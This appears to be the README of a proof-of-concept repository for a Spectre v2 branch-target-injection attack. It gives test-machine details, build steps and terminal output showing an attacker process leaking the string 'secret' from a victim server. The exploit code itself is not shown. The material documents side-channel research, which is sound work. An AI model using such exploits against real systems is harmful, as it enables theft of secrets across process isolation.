# About

This repo provides proof-of-concept code that exploits a spectre v2 (branch target injection) vulnerability in a server and demonstrates a cross-process attack.

Original client (attacker) and server (victim) code is from https://www.binarytides.com/server-client-example-c-sockets-linux/. The spectre v2 bits are inspired from https://github.com/vusec/blindside and https://github.com/Anton-Cao/spectrev2-poc.git.

The PoC is tested on the following machine:

```
$ cat /proc/cpuinfo | head -27
processor : 0
vendor_id : GenuineIntel
cpu family  : 6
model   : 158
model name  : Intel(R) Xeon(R) CPU E3-1270 v6 @ 3.80GHz
stepping  : 9
microcode : 0x48
cpu MHz   : 4014.770
cache size  : 8192 KB
physical id : 0
siblings  : 8
core id   : 0
cpu cores : 4
apicid    : 0
initial apicid  : 0
fpu   : yes
fpu_exception : yes
cpuid level : 22
wp    : yes
flags   : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi
mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc art arch_perfmon pebs bts
rep_good nopl xtopology nonstop_tsc aperfmperf eagerfpu pni pclmulqdq dtes64 monitor ds_cpl vmx smx
est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes
xsave avx f16c rdrand lahf_lm abm 3dnowprefetch epb intel_pt tpr_shadow vnmi flexpriority ept vpid
fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm mpx rdseed adx smap clflushopt xsaveopt
xsavec xgetbv1 xsaves dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp
bugs    :
bogomips  : 7600.00
clflush size  : 64
cache_alignment : 64
address sizes : 39 bits physical, 48 bits virtual
power management:

$ uname -a
Linux hecate 4.8.0-39-generic #42-Ubuntu SMP Mon Feb 20 11:47:27 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:  Ubuntu 16.04.7 LTS
Release:  16.04
Codename: xenial

$ gcc --version
gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

# Instructions

Preparation:

```
$ make
```

In terminal 1:

```
$ ./victim
obj_normal.buf = aaaaaa
obj_priv.buf = secret
Socket created
bind done
Waiting for incoming connections...
Connection accepted
Client disconnected
```

In terminal 2:

```
$ ./attacker
Socket created
Connected

most hit char: 115 ('s') - 998 hits;  second most hit char:  -1 ('?') -  -1 hits
most hit char: 101 ('e') - 999 hits;  second most hit char:  -1 ('?') -  -1 hits
most hit char:  99 ('c') - 999 hits;  second most hit char: 207 ('?') -   1 hits
most hit char: 114 ('r') - 999 hits;  second most hit char:  -1 ('?') -  -1 hits
most hit char: 101 ('e') - 999 hits;  second most hit char:  -1 ('?') -  -1 hits
most hit char: 116 ('t') - 999 hits;  second most hit char:  -1 ('?') -  -1 hits
most hit char:   0 ('?') - 999 hits;  second most hit char:   1 ('?') -  64 hits
```

